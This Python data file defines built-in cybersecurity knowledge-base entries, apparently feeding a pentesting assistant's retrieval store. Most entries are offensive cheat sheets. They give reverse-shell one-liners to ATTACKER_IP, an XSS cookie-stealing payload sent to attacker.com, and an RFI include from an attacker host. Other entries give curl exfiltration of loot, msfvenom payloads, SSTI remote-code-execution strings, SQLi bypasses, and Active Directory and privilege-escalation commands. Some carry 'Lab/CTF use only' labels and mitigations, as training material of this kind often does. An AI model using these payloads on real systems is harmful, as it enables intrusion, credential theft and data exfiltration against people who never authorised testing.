"""
backend/knowledge_base/builtin_data.py - Built-in cybersecurity knowledge base entries.
Auto-ingested into ChromaDB when the knowledge base is empty.
"""

BUILTIN_DOCUMENTS = [
    {
        "title": "SQL Injection (SQLi)",
        "category": "web_exploitation",
        "content": (
            "# SQL Injection (SQLi)\n\n"
            "## What is it?\n"
            "SQL Injection is a code injection technique that exploits vulnerabilities in applications that "
            "construct SQL queries from user input without proper sanitization.\n\n"
            "## Types\n"
            "- In-band (Classic): Error-based, UNION-based\n"
            "- Blind SQLi: Boolean-based, Time-based\n"
            "- Out-of-band: DNS exfiltration, HTTP requests\n\n"
            "## Detection\n"
            "- Add a single quote ' to input fields and look for SQL errors\n"
            "- Try: ' OR '1'='1' -- -\n"
            "- Use tools: sqlmap, Burp Suite Intruder\n\n"
            "## Common Payloads (Lab/CTF use only)\n"
            "Authentication Bypass: ' OR 1=1 -- -\n"
            "UNION-Based: ' UNION SELECT username, password, NULL FROM users -- -\n"
            "Time-Based Blind: ' AND SLEEP(5) -- -\n"
            "Error-Based: ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) -- -\n\n"
            "## Tools\n"
            "- sqlmap: sqlmap -u 'http://target/page?id=1' --dbs --batch\n"
            "- Burp Suite: Intruder with SQLi payloads\n\n"
            "## Mitigation\n"
            "- Use parameterized queries / prepared statements\n"
            "- Use ORM frameworks\n"
            "- Input validation and escaping\n"
            "- Least privilege database accounts\n"
            "- WAF rules"
        ),
    },
    {
        "title": "Cross-Site Scripting (XSS)",
        "category": "web_exploitation",
        "content": (
            "# Cross-Site Scripting (XSS)\n\n"
            "## What is it?\n"
            "XSS allows attackers to inject malicious scripts into web pages viewed by other users.\n\n"
            "## Types\n"
            "- Reflected XSS: Payload in URL/request, reflected in response\n"
            "- Stored XSS: Payload stored in database, rendered to all users\n"
            "- DOM-based XSS: Payload manipulates DOM without server involvement\n\n"
            "## Common Payloads (Lab/CTF use only)\n"
            "Basic: <script>alert('XSS')</script>\n"
            "Image: <img src=x onerror=alert('XSS')>\n"
            "SVG: <svg onload=alert('XSS')>\n"
            "Cookie Stealing: <script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>\n"
            "Filter Bypass: <ScRiPt>alert('XSS')</ScRiPt>\n\n"
            "## Tools\n"
            "- XSStrike: Automated XSS scanner\n"
            "- DalFox: Parameter analysis and XSS scanning\n"
            "- Burp Suite: Active/passive scanning\n\n"
            "## Mitigation\n"
            "- Output encoding (HTML entity encoding)\n"
            "- Content Security Policy (CSP) headers\n"
            "- Input validation\n"
            "- HttpOnly and Secure cookie flags"
        ),
    },
    {
        "title": "Local/Remote File Inclusion (LFI/RFI)",
        "category": "web_exploitation",
        "content": (
            "# File Inclusion (LFI / RFI)\n\n"
            "## What is it?\n"
            "File Inclusion vulnerabilities allow attackers to include files from the server (LFI) or from "
            "remote servers (RFI) through improperly handled file paths.\n\n"
            "## LFI Payloads (Lab/CTF use only)\n"
            "Basic: ?page=../../../../etc/passwd\n"
            "Null byte (PHP < 5.3.4): ?page=../../../../etc/passwd%00\n"
            "PHP Wrappers: ?page=php://filter/convert.base64-encode/resource=index.php\n"
            "php://input: POST data as PHP code\n"
            "data://: ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+\n"
            "Log Poisoning: ?page=/var/log/apache2/access.log (send malicious User-Agent)\n\n"
            "## RFI (if allow_url_include=On)\n"
            "?page=http://attacker.com/shell.txt\n\n"
            "## Mitigation\n"
            "- Never use user input directly in file operations\n"
            "- Use whitelists for allowed file names\n"
            "- Disable allow_url_include in php.ini\n"
            "- Use realpath() to resolve paths"
        ),
    },
    {
        "title": "Server-Side Request Forgery (SSRF)",
        "category": "web_exploitation",
        "content": (
            "# Server-Side Request Forgery (SSRF)\n\n"
            "## What is it?\n"
            "SSRF tricks the server into making HTTP requests to internal resources or arbitrary external URLs.\n\n"
            "## Common Targets\n"
            "- Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS)\n"
            "- Internal services: http://localhost:8080/admin\n"
            "- Internal network: http://192.168.1.1/\n\n"
            "## Bypass Filters\n"
            "- Hex: http://0x7f.0x0.0x0.0x1\n"
            "- Decimal: http://2130706433\n"
            "- IPv6: http://[::1]\n"
            "- Short: http://127.1\n"
            "- DNS rebinding: http://localtest.me\n\n"
            "## Mitigation\n"
            "- Whitelist allowed URLs/domains\n"
            "- Block requests to internal IP ranges\n"
            "- Use network-level segmentation"
        ),
    },
    {
        "title": "Nmap Scanning Cheatsheet",
        "category": "reconnaissance",
        "content": (
            "# Nmap - Network Mapper Cheatsheet\n\n"
            "## Basic Scans\n"
            "Ping sweep: nmap -sn 192.168.1.0/24\n"
            "Quick TCP scan: nmap -sS -T4 -p- <target>\n"
            "Service version detection: nmap -sV -sC -p 22,80,443 <target>\n"
            "OS detection: nmap -O -sV <target>\n"
            "Aggressive scan: nmap -A -T4 <target>\n\n"
            "## Port Scans\n"
            "All ports: nmap -p- <target>\n"
            "Specific ports: nmap -p 80,443,8080 <target>\n"
            "UDP scan: nmap -sU --top-ports 100 <target>\n\n"
            "## NSE Scripts\n"
            "Default scripts: nmap -sC <target>\n"
            "Vulnerability scan: nmap --script vuln <target>\n"
            "SMB vuln: nmap --script smb-vuln-ms17-010 <target>\n"
            "HTTP enum: nmap --script http-enum <target>\n\n"
            "## Evasion\n"
            "Fragmented: nmap -f <target>\n"
            "Decoy: nmap -D RND:10 <target>\n"
            "Source port: nmap --source-port 53 <target>\n"
            "Timing: nmap -T0 <target> (paranoid) to nmap -T5 (insane)\n\n"
            "## Output\n"
            "All formats: nmap -oA output_name <target>\n"
            "Normal: nmap -oN output.txt <target>\n"
            "XML: nmap -oX output.xml <target>"
        ),
    },
    {
        "title": "Reverse Shell Cheatsheet",
        "category": "shells",
        "content": (
            "# Reverse Shell One-Liners (Lab/CTF use only)\n\n"
            "## Listener\n"
            "nc -lvnp 4444\n"
            "rlwrap nc -lvnp 4444\n\n"
            "## Bash\n"
            "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
            "## Python\n"
            "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/bash\",\"-i\"])'\n\n"
            "## PHP\n"
            "php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n\n"
            "## PowerShell\n"
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            "New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4444)\n\n"
            "## Netcat (no -e)\n"
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f\n\n"
            "## Upgrading Shell\n"
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
            "Ctrl+Z, then: stty raw -echo; fg\n"
            "export TERM=xterm"
        ),
    },
    {
        "title": "Linux Privilege Escalation",
        "category": "privilege_escalation",
        "content": (
            "# Linux Privilege Escalation Cheatsheet\n\n"
            "## Quick Enumeration\n"
            "whoami && id\n"
            "uname -a\n"
            "find / -perm -u=s -type f 2>/dev/null (SUID binaries)\n"
            "sudo -l\n"
            "cat /etc/crontab\n"
            "find / -writable -type d 2>/dev/null\n\n"
            "## SUID Exploitation\n"
            "find / -perm -4000 -type f 2>/dev/null\n"
            "Check GTFOBins: https://gtfobins.github.io/\n"
            "Common: /usr/bin/find, /usr/bin/vim, /usr/bin/python3\n\n"
            "## Sudo Abuse\n"
            "sudo vim -c ':!bash'\n"
            "sudo -u user /usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'\n\n"
            "## Cron Job Exploitation\n"
            "Find writable cron scripts\n"
            "PATH hijacking in cron jobs\n\n"
            "## Automated Tools\n"
            "LinPEAS: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"
            "LinEnum, Linux Exploit Suggester"
        ),
    },
    {
        "title": "Windows Privilege Escalation",
        "category": "privilege_escalation",
        "content": (
            "# Windows Privilege Escalation Cheatsheet\n\n"
            "## Quick Enumeration\n"
            "whoami /all\n"
            "systeminfo\n"
            "net user\n"
            "net localgroup administrators\n\n"
            "## Token Impersonation\n"
            "If SeImpersonatePrivilege is enabled:\n"
            "- PrintSpoofer: PrintSpoofer.exe -i -c cmd\n"
            "- JuicyPotato, GodPotato, SweetPotato\n\n"
            "## AlwaysInstallElevated\n"
            "Check: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
            "If both HKCU and HKLM = 1: msfvenom -p windows/x64/shell_reverse_tcp -f msi -o shell.msi\n\n"
            "## Unquoted Service Paths\n"
            "wmic service get name,displayname,pathname,startmode\n"
            "Look for unquoted paths with spaces\n\n"
            "## Automated Tools\n"
            "WinPEAS, PowerUp (Invoke-AllChecks), Sherlock (Find-AllVulns)"
        ),
    },
    {
        "title": "Active Directory Attacks",
        "category": "active_directory",
        "content": (
            "# Active Directory Attack Cheatsheet\n\n"
            "## Enumeration\n"
            "BloodHound: bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All\n"
            "Enum4linux: enum4linux -a DC_IP\n"
            "CrackMapExec: crackmapexec smb DC_IP -u user -p pass --users\n"
            "LDAP: ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=local'\n\n"
            "## Kerberoasting\n"
            "GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request\n"
            "Crack: hashcat -m 13100 tickets.txt wordlist.txt\n\n"
            "## AS-REP Roasting\n"
            "GetNPUsers.py domain.local/ -dc-ip DC_IP -usersfile users.txt -format hashcat\n"
            "Crack: hashcat -m 18200 hashes.txt wordlist.txt\n\n"
            "## Pass-the-Hash\n"
            "psexec.py -hashes :NTLM_HASH domain/admin@target\n"
            "evil-winrm -i target -u admin -H NTLM_HASH\n\n"
            "## DCSync\n"
            "secretsdump.py domain/admin:password@DC_IP\n\n"
            "## Key Tools\n"
            "Impacket, BloodHound, CrackMapExec (NetExec), Rubeus, Mimikatz"
        ),
    },
    {
        "title": "Directory and Content Discovery",
        "category": "reconnaissance",
        "content": (
            "# Directory and Content Discovery\n\n"
            "## Gobuster\n"
            "Directory brute-force: gobuster dir -u http://target -w wordlist.txt -t 50\n"
            "With extensions: gobuster dir -u http://target -w wordlist.txt -x php,html,txt,bak -t 50\n"
            "DNS subdomain: gobuster dns -d target.com -w subdomains.txt -t 50\n"
            "VHOST: gobuster vhost -u http://target -w wordlist.txt\n\n"
            "## ffuf\n"
            "Directory: ffuf -u http://target/FUZZ -w wordlist.txt -t 100\n"
            "Extensions: ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.html,.txt -t 100\n"
            "Subdomain: ffuf -u http://FUZZ.target.com -w subdomains.txt -t 100\n"
            "POST param: ffuf -u http://target/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt\n"
            "Filter: ffuf -u http://target/FUZZ -w wordlist.txt -fc 404 -fs 0\n\n"
            "## Wordlists\n"
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n"
            "/usr/share/wordlists/rockyou.txt\n"
            "SecLists: https://github.com/danielmiessler/SecLists"
        ),
    },
    {
        "title": "Metasploit Framework Basics",
        "category": "exploitation",
        "content": (
            "# Metasploit Framework Cheatsheet\n\n"
            "## Starting\n"
            "msfconsole\n\n"
            "## Workflow\n"
            "search <keyword> -> use <module> -> show options -> set RHOSTS/LHOST -> exploit\n\n"
            "## Common Modules\n"
            "Handler: use exploit/multi/handler\n"
            "EternalBlue: use exploit/windows/smb/ms17_010_eternalblue\n"
            "Shellshock: use exploit/multi/http/apache_mod_cgi_bash_env_exec\n"
            "Scanner: use auxiliary/scanner/smb/smb_version\n\n"
            "## Meterpreter Commands\n"
            "sysinfo, getuid, getsystem\n"
            "download, upload, shell\n"
            "portfwd add -l 8080 -p 80 -r target_ip\n"
            "hashdump, load kiwi, creds_all\n\n"
            "## Payload Generation (msfvenom)\n"
            "Windows: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe\n"
            "Linux: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf\n"
            "PHP: msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php"
        ),
    },
    {
        "title": "Burp Suite Tips",
        "category": "tools",
        "content": (
            "# Burp Suite Cheatsheet\n\n"
            "## Setup\n"
            "1. Configure browser proxy: 127.0.0.1:8080\n"
            "2. Install Burp CA certificate\n"
            "3. Add target to scope\n\n"
            "## Key Features\n"
            "- Proxy: Intercept and modify requests/responses\n"
            "- Repeater: Manually resend modified requests\n"
            "- Intruder: Automated payload injection\n"
            "- Scanner (Pro): Active vulnerability scanning\n"
            "- Decoder: Encode/decode strings\n\n"
            "## Intruder Attack Types\n"
            "- Sniper: Single payload position, one at a time\n"
            "- Battering Ram: Same payload in all positions\n"
            "- Pitchfork: Different payload lists per position (parallel)\n"
            "- Cluster Bomb: All combinations of payload lists\n\n"
            "## Useful Extensions\n"
            "Autorize, Logger++, Param Miner, Upload Scanner, JWT Editor, Turbo Intruder\n\n"
            "## Tips\n"
            "Use match/replace rules, scope filtering, passive scanning. "
            "Ctrl+R (Repeater), Ctrl+I (Intruder)."
        ),
    },
    {
        "title": "Password Attacks and Cracking",
        "category": "password_attacks",
        "content": (
            "# Password Attacks Cheatsheet\n\n"
            "## Hashcat\n"
            "Identify: hashid '<hash>' or hashcat --identify hash.txt\n"
            "MD5: hashcat -m 0 hash.txt wordlist.txt\n"
            "SHA1: hashcat -m 100 hash.txt wordlist.txt\n"
            "NTLM: hashcat -m 1000 hash.txt wordlist.txt\n"
            "sha512crypt: hashcat -m 1800 hash.txt wordlist.txt\n"
            "bcrypt: hashcat -m 3200 hash.txt wordlist.txt\n"
            "Kerberoast: hashcat -m 13100 hash.txt wordlist.txt\n"
            "Rules: hashcat -m 0 hash.txt wordlist.txt -r best64.rule\n\n"
            "## John the Ripper\n"
            "john hash.txt --wordlist=rockyou.txt\n"
            "john hash.txt --format=raw-md5\n"
            "unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt\n\n"
            "## Hydra (Online)\n"
            "SSH: hydra -l admin -P pass.txt ssh://target\n"
            "HTTP POST: hydra -l admin -P pass.txt target http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'\n"
            "FTP: hydra -l admin -P pass.txt ftp://target\n\n"
            "## CeWL\n"
            "cewl http://target.com -d 3 -m 5 -w custom_wordlist.txt"
        ),
    },
    {
        "title": "XML External Entity (XXE)",
        "category": "web_exploitation",
        "content": (
            "# XML External Entity (XXE) Injection\n\n"
            "## What is it?\n"
            "XXE exploits XML parsers that process external entity references, allowing file reading, SSRF, and RCE.\n\n"
            "## Classic XXE (File Read)\n"
            "<?xml version='1.0'?>\n"
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n"
            "<root>&xxe;</root>\n\n"
            "## Blind XXE (Out-of-Band)\n"
            "Use external DTD hosted on attacker server to exfiltrate data via HTTP.\n\n"
            "## XXE via File Upload (SVG, DOCX)\n"
            "SVG files can contain XXE payloads.\n\n"
            "## Mitigation\n"
            "- Disable external entities in XML parser\n"
            "- Use JSON instead of XML\n"
            "- Input validation\n"
            "- Disable DTD processing entirely"
        ),
    },
    {
        "title": "Insecure Direct Object Reference (IDOR)",
        "category": "web_exploitation",
        "content": (
            "# IDOR - Insecure Direct Object Reference\n\n"
            "## What is it?\n"
            "IDOR occurs when an application exposes internal object references (IDs, filenames) "
            "without verifying authorization.\n\n"
            "## Where to Look\n"
            "- API: /api/users/123/profile\n"
            "- Downloads: /download?file=report_42.pdf\n"
            "- Accounts: /account/edit?user_id=5\n\n"
            "## Testing\n"
            "1. Log in as User A, capture requests\n"
            "2. Note all ID parameters\n"
            "3. Log in as User B\n"
            "4. Replay User A requests with User B session\n"
            "5. If data leaks -> IDOR confirmed\n\n"
            "## Mitigation\n"
            "- Always verify authorization server-side\n"
            "- Use indirect references\n"
            "- Avoid sequential/predictable IDs\n"
            "- Implement proper access control"
        ),
    },
    {
        "title": "Server-Side Template Injection (SSTI)",
        "category": "web_exploitation",
        "content": (
            "# SSTI - Server-Side Template Injection\n\n"
            "## Detection\n"
            "Inject: {{7*7}} -> 49 = Jinja2/Twig\n"
            "${7*7} -> 49 = FreeMarker/Mako\n"
            "<%= 7*7 %> -> 49 = ERB (Ruby)\n\n"
            "## Jinja2 (Python/Flask) RCE\n"
            "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\n"
            "{{ cycler.__init__.__globals__.os.popen('id').read() }}\n\n"
            "## Tools\n"
            "- tplmap: Automated SSTI exploitation\n"
            "- SSTImap: Modern SSTI scanner\n\n"
            "## Mitigation\n"
            "- Never pass user input directly into templates\n"
            "- Use sandboxed template engines\n"
            "- Input validation and escaping"
        ),
    },
    {
        "title": "General Enumeration Commands",
        "category": "reconnaissance",
        "content": (
            "# Enumeration Commands Cheatsheet\n\n"
            "## SMB\n"
            "smbclient -L //target -N\n"
            "smbmap -H target\n"
            "crackmapexec smb target --shares\n"
            "enum4linux -a target\n\n"
            "## DNS\n"
            "Zone transfer: dig axfr @ns1.target.com target.com\n"
            "Subdomains: gobuster dns -d target.com -w subdomains.txt\n"
            "amass enum -d target.com\n"
            "subfinder -d target.com\n\n"
            "## SNMP\n"
            "snmpwalk -v2c -c public target\n\n"
            "## LDAP\n"
            "ldapsearch -x -H ldap://target -b 'DC=domain,DC=local'\n\n"
            "## Web\n"
            "whatweb http://target\n"
            "nikto -h http://target\n\n"
            "## Email\n"
            "theHarvester -d target.com -b all"
        ),
    },
    {
        "title": "Post-Exploitation Techniques",
        "category": "post_exploitation",
        "content": (
            "# Post-Exploitation Cheatsheet\n\n"
            "## File Transfer\n"
            "Python HTTP: python3 -m http.server 8080\n"
            "Linux download: wget or curl from attacker server\n"
            "Windows download: certutil -urlcache -split -f http://ATTACKER/file.exe file.exe\n"
            "PowerShell: Invoke-WebRequest -Uri http://ATTACKER/file.exe -OutFile file.exe\n"
            "SCP: scp file user@target:/tmp/\n"
            "SMB: impacket-smbserver share . -smb2support\n\n"
            "## Persistence (Lab only)\n"
            "Linux: cron jobs, SSH keys\n"
            "Windows: Registry run keys, scheduled tasks\n\n"
            "## Lateral Movement\n"
            "PSExec: psexec.py domain/user:pass@target\n"
            "WMI: wmiexec.py domain/user:pass@target\n"
            "WinRM: evil-winrm -i target -u user -p pass\n"
            "RDP: xfreerdp /v:target /u:user /p:pass\n\n"
            "## Data Exfiltration\n"
            "Archive: tar czf /tmp/loot.tar.gz sensitive_files\n"
            "HTTP: curl -X POST -F 'file=@loot.tar.gz' http://ATTACKER/upload\n"
            "DNS: dnscat2 or iodine for stealthy exfil"
        ),
    },
    {
        "title": "Web Application Pentesting Methodology",
        "category": "methodology",
        "content": (
            "# Web Application Pentesting Methodology\n\n"
            "## Phase 1: Reconnaissance\n"
            "Identify technologies, directory brute-force, subdomain enum, JS analysis, "
            "robots.txt, sitemap.xml, .git exposure\n\n"
            "## Phase 2: Mapping\n"
            "Spider the app, identify input points, map auth flows, find API endpoints\n\n"
            "## Phase 3: Vulnerability Discovery\n"
            "- Auth: Default creds, brute-force, login bypass\n"
            "- AuthZ: IDOR, privilege escalation, forced browsing\n"
            "- Injection: SQLi, XSS, SSTI, Command Injection\n"
            "- Files: LFI, RFI, file upload bypass, path traversal\n"
            "- Logic: Price manipulation, race conditions\n"
            "- Session: Fixation, insecure tokens\n"
            "- SSRF, XXE, CORS misconfiguration\n\n"
            "## Phase 4: Exploitation\n"
            "Confirm with PoC, escalate impact, chain vulns, document everything\n\n"
            "## Phase 5: Reporting\n"
            "Executive summary, findings with CVSS, steps to reproduce, remediation"
        ),
    },
    {
        "title": "OWASP Top 10 (2021) Summary",
        "category": "standards",
        "content": (
            "# OWASP Top 10 - 2021\n\n"
            "A01: Broken Access Control - IDOR, privilege escalation, forced browsing\n"
            "A02: Cryptographic Failures - Weak encryption, cleartext data\n"
            "A03: Injection - SQLi, NoSQLi, OS Command Injection, XSS\n"
            "A04: Insecure Design - Missing threat modeling, insecure architecture\n"
            "A05: Security Misconfiguration - Default creds, verbose errors\n"
            "A06: Vulnerable Components - Known CVEs in libraries\n"
            "A07: Auth Failures - Weak passwords, missing MFA, session flaws\n"
            "A08: Software Integrity Failures - Insecure CI/CD, deserialization\n"
            "A09: Logging Failures - Missing audit logs, no alerting\n"
            "A10: SSRF - Fetching remote resources without validation"
        ),
    },
    {
        "title": "CTF Tips and Tricks",
        "category": "ctf",
        "content": (
            "# CTF Tips and Tricks\n\n"
            "## Web\n"
            "Always check source code, cookies, hidden fields\n"
            "Look for /robots.txt, /.git, /.env, /backup, /.DS_Store\n"
            "Try different HTTP methods (PUT, DELETE, PATCH)\n"
            "Check JWT vulnerabilities (algorithm confusion, none)\n\n"
            "## Crypto\n"
            "CyberChef for encoding/decoding chains\n"
            "RsaCtfTool for RSA challenges\n"
            "Check: Caesar, Vigenere, Base64, Hex, ROT13, XOR\n\n"
            "## Forensics\n"
            "file command to identify types\n"
            "strings for readable text in binaries\n"
            "binwalk to extract embedded files\n"
            "steghide extract -sf image.jpg\n"
            "exiftool for metadata\n"
            "volatility for memory forensics\n\n"
            "## Binary Exploitation\n"
            "checksec ./binary for protections (NX, ASLR, Canary, PIE)\n"
            "gdb + pwntools for exploit dev\n"
            "Buffer overflow: find offset -> overwrite return address\n"
            "ROP chains for NX bypass, ret2libc\n\n"
            "## Misc\n"
            "strace/ltrace to trace calls\n"
            "Google error messages\n"
            "Check Wayback Machine"
        ),
    },
]
